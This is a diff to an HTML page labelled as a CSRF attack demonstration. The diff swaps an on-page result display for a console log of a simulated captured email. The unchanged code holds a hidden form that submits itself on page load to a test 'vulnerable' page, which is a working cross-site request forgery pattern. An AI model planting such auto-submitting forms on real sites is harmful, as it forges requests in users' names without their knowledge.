@@ -30,20 +30,13 @@
         p {
             font-size: 18px;
         }
-        .result {
-            margin-top: 20px;
-            font-size: 18px;
-        }
-        .result h2 {
-            color: #007bff;
-        }
     </style>
 </head>
 <body>
     <header>CSRF Attack Page</header>
     <div class="container">
         <h1>CSRF Attack Example</h1>
-        <p>This page demonstrates a CSRF attack. The form below will automatically submit a request to the vulnerable page, and we will display the email input from the vulnerable page.</p>
+        <p>This page demonstrates a CSRF attack. The form below will automatically submit a request to the vulnerable page, and the email input will be logged to the console.</p>
         
         <!-- Form that performs the CSRF attack -->
         <form action="https://perse-22.github.io/test/csrfvuln.html" method="GET" style="display:none;">
@@ -54,12 +47,9 @@
             // Automatically submit the CSRF form
             document.forms[0].submit();
 
-            // Simulate capturing and displaying the result (in practice, you would need a server to do this)
+            // Simulate capturing and logging the result
             const emailInput = "attacker@example.com"; // Simulated email value
-            const resultDiv = document.createElement('div');
-            resultDiv.className = 'result';
-            resultDiv.innerHTML = `<h2>Captured Email Input:</h2><pre>${emailInput}</pre>`;
-            document.body.appendChild(resultDiv);
+            console.log(`Captured Email Input: ${emailInput}`);
         </script>
     </div>
 </body>
